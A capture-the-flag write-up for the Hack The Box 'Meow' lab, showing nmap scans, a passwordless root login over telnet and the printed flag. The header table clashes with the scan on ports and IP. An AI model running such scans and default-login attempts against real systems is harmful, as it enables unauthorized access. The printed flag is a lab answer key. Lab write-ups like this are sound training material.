---
title: "HTB - Meow Writeup - Linux ( Very Easy)"
date: 2026-10-25 12:00:00 -0400
categories: [HTB, Linux(Very Easy)]
tags: [htb, veryeasy, liunux]
image:
  path: /assets/img/headers/meow.png
  alt: HTB-meow
---



| Target Property  | Details                   |
| :--------------- | :------------------------ |
| **Machine Name** | Meow                      |
| **Platform**     | Hack The Box (Easy Linux) |
| **Server IP**    | 10.129.1.17               |
| **Open Ports**   | 22, 80                    |
| **Date Solved**  | 2026/10/25                |




[Hack The Box - Meow](https://app.hackthebox.com/machines/Meow)



Port Scan
```
┌──(chako㉿kali)-[~/writeup/htb/veryeasy/linux/1-Meow]
└─$ nmap -p- -vvv --min-rate 10000 meow.htb -oN nmap/meow_allport --open  
Starting Nmap 7.991 ( https://nmap.org ) at 2026-10-25 18:42 -0400
mass_dns: Using DNS server 192.168.4.1
mass_dns: Using DNS server fd0c:6c7b:e14c:1::1
Initiating Parallel DNS resolution of 1 host. at 18:42
Completed Parallel DNS resolution of 1 host. at 18:42, 0.00s elapsed
Initiating Ping Scan at 18:42
Scanning meow.htb (10.129.1.17) [4 ports]
Completed Ping Scan at 18:42, 0.12s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 18:42
Completed Parallel DNS resolution of 1 host. at 18:42, 0.00s elapsed
Initiating SYN Stealth Scan at 18:42
Scanning meow.htb (10.129.1.17) [65535 ports]
Discovered open port 23/tcp on 10.129.1.17
Completed SYN Stealth Scan at 18:42, 8.17s elapsed (65535 total ports)
Nmap scan report for meow.htb (10.129.1.17)
Host is up, received echo-reply ttl 63 (0.095s latency).
Scanned at 2026-10-25 18:42:08 EDT for 9s
Not shown: 64254 closed tcp ports (reset), 1280 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
23/tcp open  telnet  syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 8.40 seconds
           Raw packets sent: 79058 (3.479MB) | Rcvd: 67797 (2.712MB)
           

┌──(chako㉿kali)-[~/writeup/htb/veryeasy/linux/1-Meow]
└─$ nmap -p 23 -sCV meow.htb -oN nmap/meow.htb
Starting Nmap 7.991 ( https://nmap.org ) at 2026-10-25 18:45 -0400
Nmap scan report for meow.htb (10.129.24.116)
Host is up (0.080s latency).

PORT   STATE SERVICE VERSION
23/tcp open  telnet  Linux telnetd
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                                                                                                                                    
Nmap done: 1 IP address (1 host up) scanned in 20.76 seconds           
         

```



Tried serval username then tried the "'root" user.  we can login to the system without password
```
┌──(chako㉿kali)-[~/writeup/htb/veryeasy/linux/1-Meow]
└─$ telnet meow.htb                                                                                                                                                                                                                               
Trying 10.129.24.116...
Connected to meow.htb.
Escape character is '^]'.

  █  █         ▐▌     ▄█▄ █          ▄▄▄▄
  █▄▄█ ▀▀█ █▀▀ ▐▌▄▀    █  █▀█ █▀█    █▌▄█ ▄▀▀▄ ▀▄▀
  █  █ █▄█ █▄▄ ▐█▀▄    █  █ █ █▄▄    █▌▄█ ▀▄▄▀ █▀█


Meow login: root
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-77-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun 25 Oct 2026 10:49:03 PM UTC

  System load:           0.01
  Usage of /:            41.7% of 7.75GB
  Memory usage:          4%
  Swap usage:            0%
  Processes:             136
  Users logged in:       0
  IPv4 address for eth0: 10.129.24.116
  IPv6 address for eth0: dead:beef::a0de:adff:fe04:e623

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

75 updates can be applied immediately.
31 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Mon Sep  6 15:15:23 UTC 2021 from 10.10.14.18 on pts/0
root@Meow:~# 

```


get flag.txt
```
root@Meow:~# pwd
/root
root@Meow:~# lsb_release -a
No LSB modules are available.
Distributor ID: Ubuntu
Description:    Ubuntu 20.04.2 LTS
Release:        20.04
Codename:       focal
root@Meow:~# ls
flag.txt  snap
root@Meow:~# cat flag.txt 
b40abdfe23665f766f9c61ecba8a4c19
root@Meow:~# 

```

